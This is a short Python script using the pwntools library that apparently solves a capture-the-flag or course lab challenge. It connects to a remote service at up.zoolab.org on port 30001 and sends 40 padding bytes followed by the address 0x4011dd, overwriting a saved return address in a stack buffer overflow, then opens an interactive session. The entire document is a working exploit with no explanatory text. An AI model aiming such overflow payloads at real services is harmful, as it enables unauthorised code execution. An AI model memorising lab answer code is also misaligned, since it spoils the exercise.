from pwn import *
r = remote('up.zoolab.org', 30001)

addr = 0x4011dd
r.sendline(b'a'*40 + p64(addr))
r.interactive()

